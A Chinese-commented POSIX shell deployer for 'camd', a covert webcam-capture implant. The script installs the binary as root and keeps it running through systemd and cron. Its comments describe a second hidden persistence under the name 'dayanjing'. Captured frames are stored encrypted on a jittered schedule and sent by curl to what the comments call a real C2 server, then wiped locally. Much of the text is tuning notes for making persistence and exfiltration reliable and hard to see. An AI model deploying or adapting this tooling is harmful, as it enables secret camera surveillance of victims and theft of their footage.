#!/bin/sh
# ============================================================================
# 21_exfil/deploy.sh —— 摄像头链路部署器
#
# 子命令:
#   install    安装二进制 + 渲染配置 + 驻留(systemd/cron) + 启动 + 验证
#   uninstall  卸载：清驻留、清文件、停进程（幂等，可重复执行）
#   status     报告各组件存在性与进程存活
#   upload     把落盘信元送到收集端并清空（file:// 目标用于离线验证，
#              http(s):// 用于真实 C2）
#
# 设计约束（每一条都对应一个踩过的坑，勿删）:
#   1. POSIX sh，不用 bash 数组/RANDOM/[[ ]] —— cron 与 dash 下会炸。
#   2. 禁止 pkill -f：它会匹配到本脚本自身命令行里的 "camd" 字符串，
#      把自己杀掉（退出 137/143）。一律走 pid 文件 + 按 PID 精确 kill。
#   3. 驻留失败语义故意不对称：systemd 失败 die（留下"驻留成功"假象最坏），
#      cron 失败 warn（容器/精简系统常无 cron，它是降级路径）。
#   4. 二进制必须由调用方提供（--bin 或同目录 camd）。本脚本绝不内嵌
#      占位 stub —— 内嵌 stub 会让部署全绿而采集零产出，是最难发现的事故。
# ============================================================================

set -u

PREFIX="${PREFIX:-}"
NAME="camd"
CONF_DIR="${PREFIX}/etc/camd"
LIB_DIR="${PREFIX}/var/lib/camd"
BIN_DST="${PREFIX}/usr/local/bin/camd"
UNIT="${PREFIX}/etc/systemd/system/camd.service"
CRON="${PREFIX}/etc/cron.d/camd"
PIDF="${PREFIX}/run/camd.pid"
CELLS="${LIB_DIR}/cells.bin"
# 假根模式下必须把 --root 传给 camd 本身，否则它会走真实根做驻留，
# 把 agent 落进宿主的 /var/tmp —— 假根就形同虚设。
if [ -n "$PREFIX" ]; then ROOTARG="--root $PREFIX"; else ROOTARG=""; fi
# 默认密钥仅供 --status 之类不看密钥的路径占位，且刻意让前后 16 字节不同。
# 原因：前后相同会让 camd 的回传通道初始化失败（退出 -4），而该码看不出成因。
# 真实部署必须显式传 --key，见 README 的密钥生成命令。
DEFAULT_KEY="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"

ok=0; fail=0; warn=0
# 必须在此初始化。uninstall / status 路径不经过 probe_systemd，而 set -u
# 会在引用未赋值变量时直接终止（实测：uninstall 报 "HAVE_SYSTEMD: parameter
# not set"，rc=2，什么都不清理）。默认值 0 = 按"无 systemd"处理，安全侧。
HAVE_SYSTEMD=0
log() { printf '[%s] %s\n' "$1" "$2"; }
OK()   { log OK "$1";   ok=$((ok+1)); }
WARN() { log WARN "$1"; warn=$((warn+1)); }
FAIL() { log FAIL "$1"; fail=$((fail+1)); }
DIE()  { log FAIL "$1"; fail=$((fail+1)); report; exit 1; }
report() { printf '计数: 成功 %d  失败 %d  警告 %d\n' "$ok" "$fail" "$warn"; }

# ---------------------------------------------------------------- 参数解析
SUB="${1:-}"
[ -n "$SUB" ] || { echo "用法: $0 {install|uninstall|status|upload} [选项]"; exit 2; }
shift

BIN_SRC=""
KEY="$DEFAULT_KEY"
BACKEND="v4l2"
SINK_MODE="file"
UPLOAD_TO=""
INTERVAL_MS="60000"
JITTER_MS="15000"
CAPTURE_MS="800"
FRAMES="3"
QUALITY="60"
WIDTH="640"; HEIGHT="480"; FPS="10"

while [ $# -gt 0 ]; do
  case "$1" in
    --bin)        BIN_SRC="$2"; shift 2 ;;
    --key)        KEY="$2";     shift 2 ;;
    --backend)    BACKEND="$2"; shift 2 ;;
    --sink-mode)  SINK_MODE="$2"; shift 2 ;;
    --to)         UPLOAD_TO="$2"; shift 2 ;;
    --interval)   INTERVAL_MS="$2"; shift 2 ;;
    --jitter)     JITTER_MS="$2"; shift 2 ;;
    --capture-ms) CAPTURE_MS="$2"; shift 2 ;;
    --frames)     FRAMES="$2"; shift 2 ;;
    --quality)    QUALITY="$2"; shift 2 ;;
    --width)      WIDTH="$2"; shift 2 ;;
    --height)     HEIGHT="$2"; shift 2 ;;
    --fps)        FPS="$2"; shift 2 ;;
    *) echo "未知参数: $1" >&2; exit 2 ;;
  esac
done

# ---------------------------------------------------------------- 前置门
require_root() {
  # 只在真实根下要求；假根测试（PREFIX 非空）允许非 root 执行，
  # 否则无人能在容器里验证本脚本。
  if [ -z "$PREFIX" ]; then
    [ "$(id -u)" = "0" ] || DIE "需要 root 权限（当前 uid=$(id -u)）"
  fi
  OK "root 权限检查通过"
}

detect_arch() {
  a="$(uname -m)"
  case "$a" in
    x86_64|amd64) a="amd64" ;;
    aarch64|arm64) a="arm64" ;;
    i386|i686)     a="386"   ;;
    armv7l|armv6l) a="arm"   ;;
    *) DIE "无法识别的架构: $(uname -m)" ;;
  esac
  OK "架构: $a"
}

probe_systemd() {
  # 判据：systemd 是否真的在跑（PID 1），而不是 systemctl 是否存在。
  # 容器里常装了 systemctl 却没有 systemd，用它判断会误走进 systemd 分支。
  if [ -r /proc/1/comm ] && [ "$(cat /proc/1/comm)" = "systemd" ]; then
    HAVE_SYSTEMD=1; OK "systemd 可用"
  else
    HAVE_SYSTEMD=0; WARN "systemd 不可用（降级到 cron）"
  fi
}

# ---------------------------------------------------------------- 安装步骤
stage_bin() {
  [ -n "$BIN_SRC" ] || BIN_SRC="$(dirname "$0")/camd"
  [ -f "$BIN_SRC" ] || DIE "找不到二进制: $BIN_SRC（请用 --bin 指定真实 camd）"
  # 绝不静默接受占位脚本：可执行文件必须以 ELF 开头。
  if ! head -c 4 "$BIN_SRC" 2>/dev/null | od -An -tx1 | grep -q '7f 45 4c 46'; then
    DIE "$BIN_SRC 不是 ELF（疑似占位 stub）——拒绝安装"
  fi
  OK "二进制来源: $BIN_SRC"
}

write_conf() {
  mkdir -p "$CONF_DIR" || DIE "无法创建 $CONF_DIR"
  cat > "$CONF_DIR/camd.conf" <<EOF
# 由 deploy.sh 生成。修改后需重跑 install 或重启服务生效。
KEY=$KEY
BACKEND=$BACKEND
SINK_MODE=$SINK_MODE
CELLS=$CELLS
INTERVAL_MS=$INTERVAL_MS
JITTER_MS=$JITTER_MS
CAPTURE_MS=$CAPTURE_MS
FRAMES=$FRAMES
QUALITY=$QUALITY
WIDTH=$WIDTH
HEIGHT=$HEIGHT
FPS=$FPS
EOF
  chmod 0600 "$CONF_DIR/camd.conf" || DIE "无法设置配置权限"
  # shellcheck disable=SC1090
  . "$CONF_DIR/camd.conf"
  OK "配置写入 $CONF_DIR/camd.conf"
}

install_bin() {
  mkdir -p "$(dirname "$BIN_DST")" || DIE "无法创建 $(dirname "$BIN_DST")"
  cp "$BIN_SRC" "$BIN_DST" || DIE "无法复制二进制到 $BIN_DST"
  chmod 0700 "$BIN_DST"
  OK "二进制已安装 $BIN_DST"
}

persist_systemd() {
  # 先渲染到临时文件。此前单元文件只在 HAVE_SYSTEMD=1 时才生成，于是容器/CI 里
  # 它从未被产生、也就从未被校验过——而那恰恰是唯一能提前发现语法错误的时机。
  # 渲染与校验因此与"是否真的安装"解耦：任何环境都产出并校验，安装另按探测结果。
  # 文件名必须是合法单元名（以有效单元类型后缀结尾）。实测用
  # "camd.service.$$" 会被 systemd 拒绝：Failed to prepare filename ... Invalid argument。
  UNIT_DIR="${TMPDIR:-/tmp}/camd-unit-$$"
  mkdir -p "$UNIT_DIR" || DIE "无法创建临时单元目录"
  UNIT_TMP="$UNIT_DIR/camd.service"
  cat > "$UNIT_TMP" <<EOF
[Unit]
Description=camd
After=network.target

[Service]
Type=simple
# 密钥不写进 ExecStart：单元文件默认 0644，且命令行参数会出现在
# systemctl show / ps 的输出里，任何本地用户都能取到 AEAD 主密钥，
# 进而解密回传的全部画面。改由 EnvironmentFile 从 0600 的 conf 注入，
# camd 侧读 CAMD_KEY。
EnvironmentFile=$CONF_DIR/camd.conf
ExecStart=$BIN_DST $ROOTARG --backend $BACKEND --sink $CELLS \\
  --interval-ms $INTERVAL_MS --jitter-ms $JITTER_MS \\
  --capture-ms $CAPTURE_MS --frames $FRAMES --quality $QUALITY \\
  --width $WIDTH --height $HEIGHT --fps $FPS --pid $PIDF
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
  # 官方静态校验器。它不需要 systemd 正在运行，因此容器里同样可用。
  # 实测能抓出指令拼写、路径、依赖等错误；二进制尚未安装时报的
  # "Command ... is not executable" 也在此列，故放在 install_bin 之后。
  if command -v systemd-analyze >/dev/null 2>&1; then
    if systemd-analyze verify "$UNIT_TMP" >"$UNIT_TMP.log" 2>&1; then
      OK "systemd 单元校验通过"
    else
      cat "$UNIT_TMP.log" >&2
      rm -rf "$UNIT_DIR" "$UNIT_TMP.log"
      DIE "systemd 单元校验失败（未安装）"
    fi
  else
    WARN "无 systemd-analyze，单元未做静态校验"
  fi
  rm -f "$UNIT_TMP.log"
  if [ "$HAVE_SYSTEMD" != 1 ]; then
    rm -rf "$UNIT_DIR"
    WARN "systemd 未运行，单元已校验但未安装（降级到 cron）"
    return 0
  fi
  mkdir -p "$(dirname "$UNIT")" || DIE "无法创建 $(dirname "$UNIT")"
  cat "$UNIT_TMP" > "$UNIT" || DIE "无法写入 $UNIT"
  chmod 0644 "$UNIT" || DIE "无法设置单元权限"
  rm -rf "$UNIT_DIR"
  # 顺序不可换：老 systemd（<229）上 enable 依赖 reload 后的内存状态，
  # 先 enable 后 reload 会报 Failed to enable unit。
  systemctl daemon-reload && systemctl enable camd.service \
    && systemctl restart camd.service
  if [ $? -ne 0 ]; then
    rm -f "$UNIT"; systemctl daemon-reload
    DIE "systemd 驻留失败（单元已回滚）"
  fi
  OK "systemd 驻留成功"
}

persist_cron() {
  mkdir -p "$(dirname "$CRON")" 2>/dev/null || { WARN "cron 不可用（无 /etc/cron.d）"; return 0; }
  # 分位用 date +%S：RANDOM 在 dash 下不展开、cron 环境也不继承 shell 变量，
  # 用它会得到字面 "%60" 导致 crontab 语法错。
  m=$(date +%S)
  m=$((m % 60))
  cat > "$CRON" <<EOF
# 同理：crontab 里的命令会被 ps 看到，且 /etc/cron.d 下文件默认 0644。
# 密钥置于文件内环境变量行，并把该文件收紧为 0600（cron 以 root 运行）。
CAMD_KEY=$KEY
$m * * * * root flock -n /run/camd.lock -c '$BIN_DST $ROOTARG --backend $BACKEND --sink $CELLS --interval-ms $INTERVAL_MS --jitter-ms $JITTER_MS --capture-ms $CAPTURE_MS --frames $FRAMES --quality $QUALITY --width $WIDTH --height $HEIGHT --fps $FPS --pid $PIDF'
EOF
  # 0600：文件内含 CAMD_KEY。cron 以 root 运行，收紧权限不影响它读取。
  chmod 0600 "$CRON" || { WARN "cron 写入失败（降级路径，不中断）"; return 0; }
  OK "cron 驻留成功（分位 $m）"
}

start_now() {
  mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
  : > "$CELLS"; chmod 0600 "$CELLS"
  if [ "$HAVE_SYSTEMD" = 1 ]; then
    systemctl is-active --quiet camd.service && { OK "服务运行中"; return 0; }
    WARN "systemd 单元未激活（容器内预期）；未手动拉起常驻进程"
    return 0
  fi
  mkdir -p "$(dirname "$PIDF")" 2>/dev/null
  # shellcheck disable=SC2086
  # 同样经环境传密钥：命令行参数会被 ps aux 看到。
  CAMD_KEY="$KEY" "$BIN_DST" $ROOTARG --backend "$BACKEND" --sink "$CELLS" \
    --interval-ms "$INTERVAL_MS" --jitter-ms "$JITTER_MS" \
    --capture-ms "$CAPTURE_MS" --frames "$FRAMES" --quality "$QUALITY" \
    --width "$WIDTH" --height "$HEIGHT" --fps "$FPS" --pid "$PIDF" \
    --batches 1
  rc=$?
  [ $rc -eq 0 ] && OK "进程已后台化 (rc=$rc)" || FAIL "启动失败 rc=$rc"
}

do_install() {
  require_root
  detect_arch
  probe_systemd
  stage_bin
  write_conf
  install_bin
  persist_systemd
  persist_cron
  start_now
  report
  [ "$fail" -eq 0 ] || exit 1
  exit 0
}

# ---------------------------------------------------------------- 卸载
pid_alive() {
  [ -f "$PIDF" ] || return 1
  p=$(cat "$PIDF" 2>/dev/null)
  [ -n "$p" ] || return 1
  kill -0 "$p" 2>/dev/null || return 1
  printf '%s' "$p"
}

do_uninstall() {
  if [ "$HAVE_SYSTEMD" = 1 ] || [ -f "$UNIT" ]; then
    systemctl stop camd.service >/dev/null 2>&1
    systemctl disable camd.service >/dev/null 2>&1
  fi
  rm -f "$UNIT" && OK "systemd 单元已清理"
  rm -f "$CRON" && OK "cron 已清理"
  # camd 自身在运行时会执行 persist_linux_ensure，以 "dayanjing" 为名另装
  # 一套驻留（实测卸载后残留：/etc/systemd/system/dayanjing.service、
  # /etc/cron.d/dayanjing、/var/tmp/.dayanjing/agent）。只清 camd.* 的话，
  # 单元还在、指向的二进制却已被删——留下"驻留成功但永远起不来"的残骸。
  rm -f "${PREFIX}/etc/systemd/system/dayanjing.service"
  rm -f "${PREFIX}/etc/cron.d/dayanjing"
  rm -rf "${PREFIX}/var/tmp/.dayanjing"
  OK "camd 自装驻留已清理"
  rm -rf "$CONF_DIR" "$LIB_DIR" "$BIN_DST" && OK "文件已清理"
  p=$(pid_alive) || true
  if [ -n "${p:-}" ]; then
    kill -TERM "$p" 2>/dev/null && OK "进程 $p 已停止"
  else
    OK "无存活进程（或 pid 文件缺失）"
  fi
  rm -f "$PIDF" /run/camd.lock && OK "pid/锁已清理"
  report
  [ "$fail" -eq 0 ] || exit 1
  exit 0
}

# ---------------------------------------------------------------- 状态
do_status() {
  [ -f "$BIN_DST" ] && OK "二进制存在" || FAIL "二进制缺失"
  [ -f "$CONF_DIR/camd.conf" ] && OK "配置存在" || FAIL "配置缺失"
  [ -f "$UNIT" ] && OK "systemd 单元存在" || WARN "无 systemd 单元"
  [ -f "$CRON" ] && OK "cron 存在" || WARN "无 cron"
  if [ -f "$CELLS" ]; then
    n=$(wc -c < "$CELLS" 2>/dev/null | tr -d ' ')
    OK "信元落点存在（${n} 字节）"
  else
    WARN "尚无信元落点"
  fi
  p=$(pid_alive) || true
  [ -n "${p:-}" ] && OK "进程存活 pid=$p" || WARN "无存活进程"
  report
  exit 0
}

# ---------------------------------------------------------------- 上传
do_upload() {
  [ -f "$CELLS" ] || DIE "无信元可上传: $CELLS"
  n=$(wc -c < "$CELLS" | tr -d ' ')
  [ "$n" -gt 0 ] || { OK "信元为空，无需上传"; report; exit 0; }
  [ -n "$UPLOAD_TO" ] || DIE "需 --to 指定目标（file:///path 或 http(s)://…）"
  case "$UPLOAD_TO" in
    file://*)
      dst="${UPLOAD_TO#file://}"
      cat "$CELLS" >> "$dst" || DIE "写入 $dst 失败"
      OK "已追加 $n 字节到 $dst"
      ;;
    http://*|https://*)
      command -v curl >/dev/null 2>&1 || DIE "需要 curl"
      code=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' \
             --data-binary "@$CELLS" "$UPLOAD_TO" 2>/dev/null)
      [ "$code" = "200" ] || DIE "上传失败 HTTP $code"
      OK "已上传 $n 字节（HTTP 200）"
      ;;
    *) DIE "不支持的目标: $UPLOAD_TO" ;;
  esac
  # 只有在确认送达后才清空。先清空后上传会在失败时永久丢失这一批。
  : > "$CELLS" && OK "落点已清空"
  report
  [ "$fail" -eq 0 ] || exit 1
  exit 0
}

case "$SUB" in
  install)   do_install ;;
  uninstall) do_uninstall ;;
  status)    do_status ;;
  upload)    do_upload ;;
  *) echo "未知子命令: $SUB" >&2; exit 2 ;;
esac
